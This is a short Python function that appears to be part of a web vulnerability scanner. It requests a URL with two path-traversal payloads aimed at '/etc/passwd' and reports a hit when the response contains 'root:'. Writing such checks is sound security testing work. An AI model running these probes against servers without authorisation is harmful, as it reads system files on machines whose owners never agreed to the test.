import requests
from urllib.parse import urljoin


def check_directory_traversal(url):
    print(f"\n[+] Checking for directory traversal on {url}")
    payloads = ["../etc/passwd", "../../etc/passwd"]
    for payload in payloads:
        test_url = urljoin(url, payload)
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200 and "root:" in response.text:
                print(f"Vulnerability: Directory traversal at {test_url}")
            else:
                print(f"No issue found with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error testing {test_url}: {e}")

